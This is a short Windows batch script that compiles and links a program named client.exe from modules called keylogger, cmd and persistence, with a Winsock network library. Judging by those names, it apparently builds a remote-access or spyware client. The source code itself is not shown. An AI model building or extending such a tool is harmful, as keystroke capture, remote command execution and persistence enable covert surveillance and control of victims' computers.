@echo off
echo Compiling your program...

g++ -c client.cpp 
g++ -c keylogger.cpp
g++ -c cmd.cpp
g++ -c persistence.cpp

echo Linking...
g++ -o client.exe client.o cmd.o keylogger.o persistence.o -lws2_32

echo Done.